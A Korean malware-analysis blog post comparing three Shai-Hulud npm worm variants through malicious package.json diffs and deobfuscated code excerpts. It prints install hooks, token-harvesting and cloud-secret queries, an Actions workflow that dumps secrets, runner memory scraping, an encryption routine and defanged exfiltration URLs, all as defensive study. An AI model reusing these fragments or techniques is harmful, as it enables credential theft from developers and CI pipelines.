---
title: "Shai-Hulud 상세 분석: 원본부터 Second Coming과 Mini까지"
published: 2026-10-08
description: "@ctrl/tinycolor, @asyncapi/cli, @antv/adjust의 버전별 diff로 원본 Shai-Hulud와 후속 변종의 자격증명·secret 수집과 유출 경로를 비교하는 분석"
tags: ["npm", "Supply Chain Security", "Shai-Hulud", "Malware Analysis", "CI/CD"]
image: "/posts/shai-hulud-diff-analysis/cover.png"
category: "Security"
lang: "ko"
urlSlug: "shai-hulud-diff-analysis"
translationKey: "shai-hulud-diff-analysis"
draft: false
---

안녕하세요. [지난 글](/posts/shai-hulud-campaign/)에서는 Shai-Hulud 캠페인의 전체 흐름을 정리했습니다. 이번 글에서는 원본의 `@ctrl/tinycolor`를 시작으로 Second Coming의 `@asyncapi/cli`, Mini의 AntV 사례인 `@antv/adjust`까지, 실제 패키지 diff를 따라가며 살펴보겠습니다.

이번에는 **어디서 자격증명과 키를 가져오고, 어떻게 외부로 보내는가**에 집중하겠습니다. 원본에서 기본 구조를 살펴본 뒤, 후속 사례에서 수집 대상과 토큰 재사용 방식이 어떻게 달라지는지 비교합니다. 모든 diff는 **같은 패키지의 기준 버전 → 악성 버전**을 비교한 것입니다.

## 비교 대상과 읽는 순서

| 사례 | 기준 버전 → 악성 버전 | 추가 파일 | 집중해서 볼 부분 |
| --- | --- | --- | --- |
| Original · 2025-09 | `@ctrl/tinycolor` `4.1.0 → 4.1.1` | `bundle.js` | 로컬 토큰·홈 디렉터리·클라우드 secret 수집 |
| Second Coming · 2025-11 | `@asyncapi/cli` `4.1.1 → 4.1.3` | `setup_bun.js`, `bun_environment.js` | Actions secret을 artifact로 회수하고 재사용 |
| Mini의 AntV 사례 · 2026-05-19 | `@antv/adjust` `0.2.5 → 0.3.5` | 루트 `index.js` | runner 메모리·추가 secret 저장소 수집, 암호화 전송 |

세 비교쌍 모두 **기존 파일 중 `package.json`만 바뀌고 실행 파일이 추가**됐습니다. 정상 기능을 수정하지 않아도 설치 스크립트가 새 파일을 실행하면, 설치 프로세스의 권한으로 자격증명에 접근할 수 있습니다.

> **분석 범위:** 아래는 선택한 세 배포본의 정적 분석입니다. 코드에 있는 수집·전송 경로와 실제 피해 환경에서의 성공 여부는 구분합니다. 이 시간순 비교만으로 동일 공격자의 연속 개발 이력이나 Mini 전체의 변형을 확정하지는 않습니다. 샘플 출처와 무결성 확인 범위는 글 끝에 모았습니다.

## Original — @ctrl/tinycolor

### 설치 diff: 색상 라이브러리에 추가된 실행 경로

아래는 저장된 `package.json` diff 전체입니다.

```diff
--- normal_raw/package/package.json
+++ malicious_raw/package/package.json
@@ -1,6 +1,6 @@
 {
   "name": "@ctrl/tinycolor",
-  "version": "4.1.0",
+  "version": "4.1.1",
   "description": "Fast, small color manipulation and conversion for JavaScript",
   "author": "Scott Cooper <scttcper@gmail.com>",
   "publishConfig": {
@@ -34,7 +34,8 @@
     "docs:build": "typedoc --out demo/dist/docs --hideGenerator --tsconfig tsconfig.build.json src/public_api.ts",
     "test": "vitest run",
     "test:watch": "vitest",
-    "test:ci": "vitest run --coverage --reporter=default --reporter=junit --outputFile=./junit.xml"
+    "test:ci": "vitest run --coverage --reporter=default --reporter=junit --outputFile=./junit.xml",
+    "postinstall": "node bundle.js"
   },
   "devDependencies": {
     "@ctrl/eslint-config": "4.0.14",
@@ -56,4 +57,4 @@
   "engines": {
     "node": ">=14"
   }
-}
+}
\ No newline at end of file
```

핵심은 `postinstall: node bundle.js`입니다. 기준 버전의 41개 파일에서 `package.json`만 바뀌고, 약 3.7MB의 `bundle.js`가 추가됐습니다. **tinycolor 함수를 호출할 필요 없이**, lifecycle script 실행이 허용된 설치에서 본체가 실행될 수 있습니다.

파일 끝의 `main()`부터 모듈을 역으로 따라가면 수집 경로는 세 갈래로 나뉩니다.

| 수집 경로 | 사용하는 권한·자료 | 얻으려는 값 |
| --- | --- | --- |
| 로컬 환경 | 환경 변수, `.npmrc`, GitHub CLI, 홈 디렉터리 | npm·GitHub 토큰과 파일 속 secret |
| 클라우드 API | 로컬에서 사용할 수 있는 AWS·GCP 인증 정보 | Secrets Manager / Secret Manager의 값 |
| GitHub Actions | 확보한 GitHub 토큰으로 workflow 작성 | 실행 시 workflow에 제공되는 secrets |

### 1. npm·GitHub 토큰: 개발자가 이미 쓰던 인증 정보를 읽는다

npm 토큰의 첫 출처는 `NPM_TOKEN`입니다. 없으면 `parseNpmToken()`으로 넘어갑니다.

```js
let re = process.env.NPM_TOKEN;
re || (re = (0, _lib_utils__WEBPACK_IMPORTED_MODULE_1__.parseNpmToken)() ?? void 0);
```

파서는 **현재 작업 디렉터리의 `.npmrc` → 사용자 홈의 `.npmrc`** 순서로 파일을 읽고, 다음 정규식에 처음 맞는 값을 반환합니다.

```js
const r = /(?:_authToken|:_authToken)=([a-zA-Z0-9\-._~+/]+=*)/,
  n = t ? [t] : [te.join(process.cwd(), ".npmrc"), te.join(re.homedir(), ".npmrc")];
```

이는 npm에 새 자격증명을 요청하는 과정이 아닙니다. 개발 환경에 저장된 `_authToken` 값을 그대로 가져오는 것입니다.

GitHub도 같은 방식입니다. `GitHubModule.getToken()`은 `GITHUB_TOKEN`을 우선하고, 없으면 `gh auth token`의 출력을 읽습니다. 개발자가 GitHub CLI에 로그인해 둔 상태도 토큰 출처가 됩니다.

| 대상 | 읽는 순서 | 판정할 때 주의할 점 |
| --- | --- | --- |
| npm | `NPM_TOKEN` → 현재 `.npmrc` → 홈 `.npmrc` | `/-/whoami`로 사용자 확인; 패키지 발행 권한과는 별개 |
| GitHub | `GITHUB_TOKEN` → `gh auth token` | `isAuthenticated()`는 토큰 존재만 확인; 실제 사용자 조회는 `getUser()` |

특히 **토큰이 있다는 것과 유효한 권한이 있다는 것은 다릅니다.** 결과 객체의 `authenticated`라는 이름만으로 인증 성공을 판단하면 안 됩니다.

### 2. TruffleHog: 홈 디렉터리에 남아 있는 secret을 찾는다

직접 읽는 토큰 외에는 TruffleHog를 사용합니다. 현재 작업 디렉터리에 실행 파일이 없으면 공식 릴리스에서 준비하며, 실제 스캔은 다음 두 발췌로 확인할 수 있습니다.

```js
const le = ["filesystem", t, "--json", "--results=verified"];
```

```js
const t = (0, te.spawn)(this.binaryPath, le, {
  cwd: ie.homedir(),
  env: process.env,
  stdio: ["pipe", "pipe", "pipe"]
})
```

`scanFilesystem()`의 기본 대상 `t`는 `.`이지만, 자식 프로세스의 `cwd`가 사용자 홈입니다. 따라서 **패키지 디렉터리가 아니라 홈 디렉터리의 파일**을 스캔합니다.

- `--results=verified`는 도구에 전달하는 출력 필터입니다.
- 기본 제한 시간은 90초이며, 표준 출력을 문자열로 모읍니다.
- 이 출력은 유출 객체에 들어갑니다. `main()`의 npm 전파는 별도 병렬 분기여서, **TruffleHog가 찾은 토큰을 곧바로 재배포에 사용한다고 볼 수는 없습니다.**

### 3. AWS·GCP: 키 파일을 읽는 데서 secret 값 조회로 넘어간다

AWS 모듈은 `AWS_PROFILE` 또는 `default`, 그리고 `~/.aws/credentials`·`~/.aws/config`의 프로필 이름을 후보로 삼습니다. 다음 코드는 프로필의 자격증명으로 STS에 사용자 식별 정보를 요청하는 부분입니다.

```js
const t = (0, re.fromIni)({profile: r}),
  n = new F.STSClient({region: "us-east-1", credentials: t}),
  te = await n.send(new F.GetCallerIdentityCommand({}));
```

처음 검증된 프로필을 선택한 뒤, 고정된 14개 리전에서 `ListSecrets`와 `GetSecretValue`를 호출합니다. 결과의 `secretString`·`secretBinary`는 **그 권한으로 읽을 수 있는 Secrets Manager의 실제 값**입니다. 다만 이 구현에는 `NextToken` 페이지 순회가 없어 전체 목록을 빠짐없이 읽는다고 할 수는 없습니다.

GCP는 `GoogleAuth`로 프로젝트와 인증 클라이언트를 얻고, `SecretManagerServiceClient`로 목록과 값을 조회합니다.

```js
const n = `projects/${this.projectInfo.projectId}/secrets/${t}/versions/${r}`,
  [F] = await this.secretsClient.accessSecretVersion({name: n}),
  te = F.payload?.data?.toString();
```

`getSecretValue(t, r="latest")`의 기본값 때문에 각 secret의 `latest` 버전이 대상입니다. 프로젝트 ID와 인증 클라이언트를 얻었더라도 개별 secret 읽기 권한까지 보장되는 것은 아닙니다.

두 경로의 공통점은 **로컬 인증 정보 → 서비스 API → 저장된 secret 값**이라는 연결입니다. 키 자체를 유출하는 것과, 그 키로 추가 비밀을 읽어 오는 동작이 함께 있습니다.

### 4. Actions secret: workflow 실행 문맥을 이용한다

로컬 파일에 없는 secret은 GitHub Actions에서 얻으려 합니다. `GitHubModule.extraction()`이 실행하는 내장 `processor.sh`는 `repo`·`workflow` scope를 확인하고, 대상 저장소에 별도 브랜치와 `.github/workflows/shai-hulud-workflow.yml`을 작성합니다.

수집 과정은 다음과 같습니다.

1. 삽입한 workflow가 `push` 이벤트로 실행되도록 구성합니다.
2. `${{ toJSON(secrets) }}`를 `CONTENTS` 환경 변수에 넣습니다.
3. 값을 외부 webhook으로 전송하고, Base64로 두 번 인코딩해 로그에도 출력합니다.

내장 목적지는 다음과 같습니다.

```text
hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7
```

여기서 secret 평문은 목록 API에서 나오는 것이 아닙니다. **workflow가 실행될 때 제공받는 secrets를 작업 안에서 꺼내는 방식**입니다. 토큰의 저장소 쓰기·workflow 권한과 Actions 실행 조건이 필요하며, 조직의 모든 secret에 무조건 접근하는 것은 아닙니다.

### 5. 유출 결과: 공개 저장소의 data.json

`main()`은 수집 결과를 한 객체로 묶어 `makeRepo("Shai-Hulud", ...)`에 전달합니다.

| 필드 | 유출 대상으로 넣는 내용 |
| --- | --- |
| `environment` | 이름 필터 없는 `process.env` 전체 |
| `modules.github`, `modules.npm` | 확보한 토큰과 관련 조회 결과 |
| `modules.aws.secrets`, `modules.gcp.secrets` | API로 읽기에 성공한 secret 값 |
| `modules.truffleHog` | 홈 디렉터리 스캔 출력·상태·오류 |

`makeRepo()`는 **사용한 토큰의 계정 아래** `Shai-Hulud`라는 공개 저장소를 만들고 `data.json`을 작성합니다. 공격자 소유의 고정 계정만 확인해서는 놓칠 수 있는 유출 방식입니다.

Contents API의 `content`에는 Base64를 세 번 적용합니다.

```js
content: Buffer.from(
  Buffer.from(
    Buffer.from(r).toString("base64")
  ).toString("base64")
).toString("base64")
```

가장 바깥 한 겹은 API가 파일 내용을 받는 형식이므로, 저장된 파일에는 두 겹이 남습니다. **Base64는 암호화가 아니며 비밀 키 없이 복원할 수 있습니다.**

원본의 핵심은 설치 시 접근 가능한 토큰·secret을 모아 공개 저장소와 workflow 출력 경로로 보내는 것입니다. npm 전파는 확보한 초기 토큰으로 별도 진행되며, 다른 패키지에 자기 본체와 같은 설치 명령을 넣으려 합니다.

## Second Coming — @asyncapi/cli

> **원본과의 핵심 차이:** GitHub 토큰 탐색을 넓히고, Actions secret을 artifact로 회수해 npm 토큰 후보로 다시 사용합니다. 공개 유출 저장소도 다음 실행의 토큰 공급원이 됩니다.

### 설치 diff: Node 로더를 거쳐 Bun 본체로

아래는 확보한 `4.1.1 → 4.1.3` 비교쌍의 `package.json` diff 전체입니다.

```diff
--- normal_raw/package/package.json
+++ malicious_raw/package/package.json
@@ -1,7 +1,7 @@
 {
   "name": "@asyncapi/cli",
   "description": "All in one CLI for all AsyncAPI tools",
-  "version": "4.1.1",
+  "version": "4.1.3",
   "author": "@asyncapi",
   "bin": {
     "asyncapi": "./bin/run_bin"
@@ -200,7 +200,8 @@
     "api:docker": "docker run -it -p 80:80 asyncapi/server-api",
     "api:build:docker": "docker build -t asyncapi/server-api -f ./src/apps/api/Dockerfile .",
     "api:build": "rimraf lib && npm run generate:languages && tsc && tsc-alias --project tsconfig.json",
-    "api:test": ""
+    "api:test": "",
+    "preinstall": "node setup_bun.js"
   },
   "types": "lib/index.d.ts"
-}
+}
\ No newline at end of file
```

실행 연결은 **`preinstall` → `setup_bun.js` → Bun → `bun_environment.js`**입니다. 로더는 Bun을 찾거나 설치하고, npm 배포본에 이미 들어 있는 본체를 실행합니다. 원본과 마찬가지로 정상 기능 파일을 고치는 대신 설치 경로를 추가했습니다.

이하 본체 코드는 문자열 조회를 정적으로 치환한 발췌입니다. 변수명·연산자는 유지하고 줄바꿈을 정리했습니다.

### 1. GitHub 토큰: 환경 변수의 이름보다 값을 본다

npm 토큰은 원본과 같은 `NPM_TOKEN → .npmrc` 순서입니다. GitHub의 `dq.findGitHubTokenEnvVars()`는 달라집니다.

| 출처 | Original | Second Coming |
| --- | --- | --- |
| 환경 변수 | `GITHUB_TOKEN` 하나 | 전체 값 중 `ghp_`·`gho_`로 시작하는 첫 값 |
| GitHub CLI | `gh auth token` | CLI 출력에도 같은 접두사 검사 |
| 공개 유출 자료 | 해당 대체 경로 미확인 | 다른 저장소의 `contents.json`에서 토큰 회수 |

환경 변수 이름이 달라도 접두사가 맞으면 후보가 됩니다. 반면 이 검사에 포함되지 않은 종류의 토큰까지 모두 선택하는 것은 아닙니다.

로컬 토큰이 없거나 유출 저장소를 만들지 못하면 `dq.fetchToken()`은 다음 경로를 시도합니다.

1. `"Sha1-Hulud: The Second Coming."`이라는 문자열로 저장소를 검색합니다. `Sha1`에는 숫자 `1`이 들어갑니다.
2. 검색 결과의 `main/contents.json`을 읽고 Base64를 풀어 JSON을 얻습니다.
3. `modules.github.token`을 꺼내 `GET /user`의 200 응답으로 검사합니다.
4. 얻은 토큰으로 새 GitHub 클라이언트를 구성합니다.

**유출 자료가 다음 감염의 인증 수단이 되는 연결**입니다. 다만 이 대체 토큰 경로에서는 아래의 Actions secret 회수와 그 결과를 이용한 npm 재시도를 건너뜁니다.

### 2. Actions secret: webhook 대신 artifact를 회수한다

원본이 workflow 안에서 webhook과 로그로 내보냈다면, Second Coming의 `ky1()` → `mq.processReposStream()`은 **workflow 결과를 본체가 다시 가져옵니다.**

| 단계 | 코드에서 확인한 처리 |
| --- | --- |
| 대상 선택 | 최근 수정 조건에 맞는 저장소를 최대 50개까지 전달하고, Actions secrets 목록의 개수가 0이면 제외 |
| workflow 작성 | 별도 브랜치에 `.github/workflows/formatter_123456789.yml` 생성 |
| secret 꺼내기 | `DATA: ${{ toJSON(secrets)}}`를 이용해 `format.json` 작성 |
| artifact 업로드 | `formatting`이라는 이름으로 파일 업로드 |
| 회수·정리 | 실행 결과의 ZIP에서 JSON을 읽고, run·브랜치 삭제 시도 |

이름은 `Code Formatter`지만 데이터 원천은 코드가 아니라 **workflow에 제공되는 secrets**입니다. secrets 목록 API는 대상 선정에 쓰일 뿐 평문을 반환하지 않습니다.

회수한 값은 `actionsSecrets.json`에 들어갑니다. 그리고 로컬 npm 토큰 검증이 실패하면, 각 객체에서 다음 조건에 맞는 값을 `El()`에 전달합니다.

```js
for (let [_0x11c4f3, _0x402786] of Object['entries'](_0x5998e5))
  if (typeof _0x402786 === "string" && _0x402786['startsWith']("npm_")) {
```

이렇게 **Actions secret → `npm_` 토큰 후보 → 추가 전파 시도**가 연결됩니다. 원본의 별도 TruffleHog 스캔과는 다른 데이터 흐름입니다. 재시도 조건은 npm 인증 결과이므로, 이미 인증한 토큰의 publish 실패까지 모두 이 경로로 돌아오는 것은 아닙니다.

권한 검사의 오류도 결과 해석에 중요합니다. `dq.checkWorkflowScope()`는 scope 검사값을 저장하지만 성공 경로에서 항상 true를 반환합니다.

```js
return this["hasWorkflow"] = _0x1accf9['includes']("workflow"),
  console["log"]("Error 18"), !0x0;
```

따라서 이 함수가 true여도 workflow 수정 권한을 입증하지 않습니다. 실제 실행에는 GitHub API 권한과 Actions 정책이 충족되어야 합니다.

### 3. 클라우드·파일 스캔: 늘어난 대상과 수집 결과의 차이

| 대상 | 원본에서 달라진 부분 | 실제 수집 범위를 제한하는 부분 |
| --- | --- | --- |
| AWS | 파일 프로필 외에 env·SSO·tokenFile·container·instance·process provider 검사, 17개 리전·페이지 순회 | 아래의 배열 누적 오류 |
| GCP | 프로젝트 검색 후 secret의 `latest` 조회 | 검색 결과의 첫 프로젝트만 선택 |
| Azure | `DefaultAzureCredential` → Key Vault 목록 → `getSecret()` 추가 | 첫 구독을 사용하며 리소스·secret 읽기 권한 필요 |
| TruffleHog | 홈 스캔 timeout 90초 → 600초, JSON 행을 `findings` 배열로 파싱 | `--results=verified` 필터가 없어 원본과 결과 조건이 다름 |

AWS는 시도하는 인증 출처가 늘었지만, `WX.runSecrets()`에 다음 코드가 있습니다.

```js
_0x1dbe92["concat"](
  await _0x388e01["listAndRetrieveAllSecrets"]()
);
```

`concat()`은 새 배열을 반환합니다. 반환값을 저장하지 않으므로 **조회가 성공해도 이 함수의 반환 배열에는 secret이 쌓이지 않습니다.** API 호출 범위가 넓어졌다는 사실과 `cloud.json`에 값이 들어간다는 결론을 구분해야 합니다. 환경 변수 등 다른 경로로 AWS 키가 유출될 가능성은 별개입니다.

Azure는 SDK가 포함된 데 그치지 않습니다. `aL0()`에서 `Eq.listAndRetrieveAllSecrets()`를 호출하고 반환값을 `azure.secrets`에 넣으므로, 실제 진입점에서 유출 객체까지 연결됩니다.

### 4. 유출 결과: 한 파일에서 다섯 파일로

공개 저장소의 이름은 무작위 18문자로 바뀌고, 설명에 `Sha1-Hulud: The Second Coming.`을 넣습니다. 데이터도 용도별로 분리합니다.

| 파일 | 내용 |
| --- | --- |
| `contents.json` | 시스템 정보와 GitHub 토큰·사용자 조회 결과 |
| `environment.json` | 환경 변수 전체 |
| `cloud.json` | AWS·GCP·Azure 수집 함수 반환값 |
| `truffleSecrets.json` | TruffleHog 파싱 결과와 원시 출력 |
| `actionsSecrets.json` | workflow artifact에서 회수한 secret 객체 |

각 분기와 쓰기가 성공해야 해당 파일이 생깁니다. 저장 파일에 Base64 두 겹이 남는 구조는 원본과 같아, 여기에도 암호화는 없습니다.

Second Coming에서 중요한 변화는 파일 개수보다 **탈취한 값을 다시 사용하는 경로**입니다. 공개 저장소의 GitHub 토큰은 유출 경로를 다시 마련하는 데, Actions artifact의 npm 토큰은 추가 전파에 쓰입니다.

## Mini의 AntV 사례 — @antv/adjust

> **앞선 두 사례와의 핵심 차이:** 파일·환경 변수뿐 아니라 현재 runner 메모리와 Kubernetes·Vault·비밀번호 관리 CLI로 수집 범위를 넓힙니다. 결과는 공통 처리 경로로 모이고, 전송 본문에는 실제 암호화를 적용합니다.

### 설치 diff: Bun 직접 실행과 Git 의존성

다음은 `0.2.5 → 0.3.5`의 `package.json` diff 전체입니다.

```diff
--- normal_raw/package/package.json
+++ malicious_raw/package/package.json
@@ -1,6 +1,6 @@
 {
   "name": "@antv/adjust",
-  "version": "0.2.5",
+  "version": "0.3.5",
   "description": "The adjust module for G2, F2.",
   "main": "lib/index.js",
   "module": "esm/index.js",
@@ -23,7 +23,8 @@
     "lib": "run-p lib:*",
     "build": "run-s clean lib",
     "ci": "run-s build coverage",
-    "coveralls": "cat ./coverage/lcov.info | coveralls"
+    "coveralls": "cat ./coverage/lcov.info | coveralls",
+    "preinstall": "bun run index.js"
   },
   "dependencies": {
     "@antv/util": "~2.0.0",
@@ -88,5 +89,8 @@
     "f2"
   ],
   "author": "https://github.com/orgs/antvis/people",
-  "license": "MIT"
-}
+  "license": "MIT",
+  "optionalDependencies": {
+    "@antv/setup": "github:antvis/G2#1916faa365f2788b6e193514872d51a242876569"
+  }
+}
\ No newline at end of file
```

`preinstall`은 루트의 새 `index.js`를 실행합니다. 기존 `main: lib/index.js`와 `module: esm/index.js`의 파일은 그대로이며, 정상 라이브러리 진입점을 교체한 것이 아닙니다.

Second Coming과 달리 루트 설치 명령이 Bun을 직접 요구합니다. `@antv/setup`도 GitHub의 고정 commit을 가리키지만, **외부 의존성의 payload는 확보하지 못했으므로 로컬 `index.js`와 같은 코드라고 간주하지 않습니다.** 아래는 확보한 498,431-byte 본체를 기준으로 한 분석입니다.

본문 발췌는 문자열 조회·암호화된 상수를 정적으로 복원한 코드입니다. 함수·변수명은 유지했으며 샘플을 실행한 결과는 아닙니다.

### 1. 파일·환경·CLI 결과를 한곳으로 모은다

초기 수집 `Z2()`는 `zo → vo → ko`를 차례로 호출합니다.

| 수집기 | 자료 출처 | 주로 확인할 내용 |
| --- | --- | --- |
| `zo` | OS별 파일·glob 목록 | `.npmrc`, `.env`, SSH 키, 클라우드 자격증명 파일, kubeconfig, Docker 설정 등 |
| `vo` | `process.env`, `gh auth token` | 환경 변수와 GitHub CLI 토큰 |
| `ko` | Linux GitHub Actions의 runner 메모리 | 현재 작업에 제공된 secret 흔적 |

파일은 항목별 최대 5 MiB까지 수집하며, 이진 데이터로 판단하면 `BASE64:` 접두사를 붙여 저장합니다. 수집 목록에 지갑·메신저 경로도 있지만, 파일을 가져오는 것과 해당 서비스의 암호화된 내용을 해독하는 것은 다릅니다.

`S.success()`는 결과를 직렬화하고 **해당 수집기에 등록된 정규식**으로 `matches`를 만듭니다. 이를 받은 `Po.ingest()`는 토큰 검사를 시작합니다. npm 토큰의 연결은 다음 코드로 드러납니다.

```js
// Po.handleNpmTokens()의 복원 코드
for (let _0x295898 of _0x4d3cb8) {
  let _0x5114b9 = await m7(_0x295898);
  await new Ro(_0x5114b9)["execute"]();
}
```

즉 **수집 결과의 npm 토큰 → `m7()` 권한 확인 → `Ro` 재배포**입니다. Second Coming의 Actions artifact 재사용보다 입력 경로가 넓어졌습니다. 다만 모든 cloud 결과에 같은 패턴 검사가 자동 적용되는 것은 아닙니다.

`m7()`은 토큰 목록에서 `bypass_2fa === true`, 패키지 `write` 권한 등을 확인합니다. 이는 **그 권한을 이미 가진 토큰을 골라 사용하는 검사**이며, 2FA 자체를 깨는 기능은 아닙니다.

### 2. Runner.Worker 메모리에서 secret을 찾는다

Mini에서 가장 눈여겨볼 추가 경로는 `ko`입니다. 앞선 artifact 방식이 새 workflow를 실행시켰다면, 이 수집기는 **현재 runner가 이미 보유한 데이터**를 읽으려 합니다.

```js
// ko.execute()의 진입 조건
if (!this["isGitHubActions"] || !this["isLinuxRunner"])
  return this["failure"]("Not Actions or Linux");
```

두 조건은 생성자에서 각각 `GITHUB_ACTIONS === "true"`, `RUNNER_OS === "Linux"`로 설정됩니다. 이 제한은 메모리 수집기에 붙은 것이며 Mini 전체의 실행 조건은 아닙니다.

이후 데이터 흐름은 네 단계입니다.

1. **프로세스 찾기:** `/proc/<pid>/cmdline`에서 `Runner.Worker`를 찾습니다.
2. **메모리 읽기:** 내장 Python `q7`을 `sudo python3`에 전달하고, `/proc/<pid>/maps`의 읽을 수 있는 영역을 따라 `/proc/<pid>/mem`을 읽습니다.
3. **secret 추출:** `V2()`가 바이트에서 NUL을 제거하고 `"name":{"value":"...","isSecret":true}` 형태를 찾습니다.
4. **결과 전달:** 이름·값을 정리해 저장소·workflow 정보, 발견 수, 덤프 크기와 함께 수집 결과로 돌려줍니다.

GitHub API가 secret 평문을 반환하는 기능이 아닙니다. runner 프로세스의 메모리에 접근할 수 있다는 조건을 이용한 경로입니다. 따라서 `sudo`·프로세스 메모리 읽기 권한과 검색 형식에 맞는 데이터가 필요합니다.

`detectHardenRunner()`라는 메서드도 있지만 이 `execute()`에서는 호출되지 않습니다. 이름만으로 보호 도구 탐지·우회가 실제 수행된다고 판단할 수는 없습니다.

### 3. AWS·Kubernetes·Vault·비밀번호 관리 CLI

초기 수집 뒤에는 다음 수집기들이 이어집니다.

```js
[new Do(), new Xo(), new Fo(), new ao(), new $o(), new fo()]
```

| 클래스 | 가져오려는 정보 | 사용하는 인증·권한 |
| --- | --- | --- |
| `Do` | AWS SSM Parameter Store 값 | 사용 가능한 AWS 인증 정보, 조회·복호화 권한 |
| `Xo` | AWS Secrets Manager의 secret | 리전별 목록·값 읽기 권한 |
| `Fo` | AWS 계정·ARN·사용자 식별 정보 | STS 검증; 반환값은 secret 본문보다 identity 중심 |
| `ao` | Kubernetes Secret의 `data`를 Base64로 복원한 값 | service account 또는 kubeconfig 토큰, API·RBAC 권한 |
| `$o` | Vault KV v1/v2 값 | 환경·파일 토큰 또는 Kubernetes/AWS IAM 인증 조건 |
| `fo` | `op`, `bw`, `pass`, `gopass`의 실행 결과 | 설치된 CLI와 사용 가능한 세션·인증 수단 |

AWS 결과는 `push(...ids)`와 `Object.assign()`으로 합치므로 Second Coming의 `concat()` 누락과는 다릅니다. Kubernetes와 Vault에서도 이미 사용할 수 있는 권한으로 추가 secret을 읽는 구조가 이어집니다.

여기서 수집 범위를 과장하지 않아야 할 부분은 두 가지입니다.

- **Vault:** 목록은 최대 100개까지 처리하고 `/`로 끝나는 하위 경로를 건너뜁니다. 모든 secret을 재귀적으로 읽는 구현은 아닙니다.
- **비밀번호 관리 도구:** 사용할 수 있는 CLI 세션·인증에 의존합니다. 제품의 암호화나 2FA를 일반적으로 무력화하지 않습니다.

GCP·Azure는 초기 파일 수집 목록에는 있지만, 위 배열에 별도 API 수집기는 없습니다. Second Coming의 Azure Key Vault API 조회와 같은 기능으로 묶으면 안 됩니다.

### 4. Actions artifact 수집도 유지된다

초기 결과에서 유효한 GitHub PAT/OAuth 토큰을 찾으면 `Io`가 추가됩니다. workflow scope를 확인하고, secret이 있는 저장소 중 최대 5개를 대상으로 `.github/workflows/codeql.yml`을 작성합니다.

복원한 workflow의 데이터 원천은 다음과 같습니다.

```yaml
    env:
      VARIABLE_STORE: ${{ toJSON(secrets) }}
```

이를 받는 step은 secret을 파일로 씁니다.

```yaml
      - name: Copilot Setup
        run: echo "$VARIABLE_STORE" > format-results.txt
```

workflow 이름은 `Run Copilot`이고 파일 경로는 CodeQL처럼 보이지만, 실제 동작은 `format-results.txt`를 artifact로 올리는 것입니다. 본체의 `R1()`은 ZIP에서 그 파일을 읽고, `P1()`은 run·브랜치 정리를 시도합니다.

**workflow 삽입 → artifact 회수**는 Second Coming과 같지만, Mini에서는 회수한 값이 공통 수집 결과로 돌아와 `Po → m7 → Ro`에 연결됩니다. 저장소 쓰기·workflow 권한과 실행 정책이 여전히 필요합니다.

### 5. 전송 본문: Base64에서 AES-GCM·RSA로

Mini의 `eu.createEnvelope()`는 수집 결과를 다음 순서로 변환합니다.

**JSON → gzip → AES-256-GCM 암호화 → 전송 객체**

핵심 발췌는 다음과 같습니다.

```js
// eu.createEnvelope()의 암호화 부분 발췌
_0x502c81 = _0x2bfbd9["randomBytes"](0x20),
_0x919746 = _0x2bfbd9["randomBytes"](0xc),
_0x4cf9d2 = _0x2bfbd9["publicEncrypt"]({
  'key': G7,
  'padding': _0x2bfbd9["constants"]["RSA_PKCS1_OAEP_PADDING"],
  'oaepHash': "sha256"
}, _0x502c81),
_0x6eccff = _0x2bfbd9["createCipheriv"](
  "aes-256-gcm", _0x502c81, _0x919746
);
```

| 전송 요소 | 구성 |
| --- | --- |
| 대칭키 | 매번 생성하는 32-byte 키 |
| IV | 매번 생성하는 12-byte 값 |
| `envelope` | `IV · ciphertext · tag`를 이어 붙인 Base64 |
| `key` | 대칭키를 내장 공개키 `G7`으로 RSA-OAEP/SHA-256 암호화한 뒤 Base64 |

원본과 Second Coming에서는 Base64를 풀면 JSON을 읽을 수 있었습니다. Mini의 envelope는 **Base64 해제만으로 평문을 얻을 수 없습니다.** 이 전송 암호화는 분석할 때 복원한 내장 자료의 암호화와 목적·키가 다른 경로입니다.

HTTPS 전송기 `lr`와 GitHub 전송기 `_r`가 이 형식을 공유합니다. 기본 HTTPS 목적지는 다음과 같습니다.

```text
hxxps://t[.]m-kosche[.]com:443/api/public/otel/v1/traces
```

GitHub 전송기는 무작위 이름의 공개 저장소를 만들고, 설명에 `niagA oG eW ereH :duluH-iahS`를 넣습니다. 결과 경로는 `results/results-<timestamp>-<counter>.json`입니다.

### 6. 암호화 밖으로 나가는 토큰도 있다

모든 비밀이 envelope 안에만 있는 것은 아닙니다. `lo.configureGit()`는 로컬 토큰으로 조회한 `/user/orgs` 결과가 비면 `includeToken`을 켭니다. 조회 오류도 빈 배열로 처리하므로 실제 무소속 계정에만 해당하는 조건은 아닙니다.

이 모드의 `_r.augmentEnvelope()`는 **사용 중인 GitHub 토큰을 이중 Base64로 별도 필드와 commit message에 넣습니다.** 이 값은 AES 암호문 밖에 있어 복원할 수 있습니다.

반대로 `q1()`은 `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner` 표식이 있는 commit을 검색하고, 토큰을 복원해 repository scope를 검사합니다. Second Coming의 `contents.json` 재사용이 Mini에서는 **commit message를 통한 토큰 교환**으로 바뀐 셈입니다.

이 공개 모드에는 상태 조건에 따라 삭제를 시도하는 별도 모니터 설치도 연결됩니다. 여기서는 토큰의 공개·재사용 연결만 다루며, 서비스 설치와 삭제 명령의 세부 구현은 생략합니다.

또한 초기 전송기 선택의 `healthy()` 호출에는 `await` 누락이 있고, GitHub 파일 쓰기의 응답 확인도 불완전합니다. 따라서 대체 경로가 존재한다는 이유로 모든 환경에서 전송이 성공한다고 할 수는 없습니다.

## 세 사례의 차이: 무엇을 훔치고, 어디로 보내는가

| 비교 항목 | Original | Second Coming | Mini의 AntV 샘플 |
| --- | --- | --- | --- |
| 로컬 토큰 | 지정 환경 변수·`.npmrc`·`gh` | npm 경로 유지, GitHub은 환경 변수 값 탐색 | 파일·환경·CLI 결과의 패턴 검사 |
| 파일 속 secret | TruffleHog 홈 스캔 | 홈 스캔 확대·결과 파싱 | 자체 파일 수집과 공통 결과 처리 |
| Actions secret | workflow → webhook·로그 | workflow → artifact 회수 | artifact 방식 + 현재 runner 메모리 |
| 서비스 API | AWS Secrets Manager·GCP Secret Manager | AWS 인증 출처 확대·GCP·Azure Key Vault | AWS SSM·Secrets Manager, Kubernetes·Vault·비밀번호 CLI |
| 외부 전송 | 공개 `Shai-Hulud/data.json` | 공개 저장소의 용도별 다섯 파일 | HTTPS 또는 공개 저장소의 암호화 객체 |
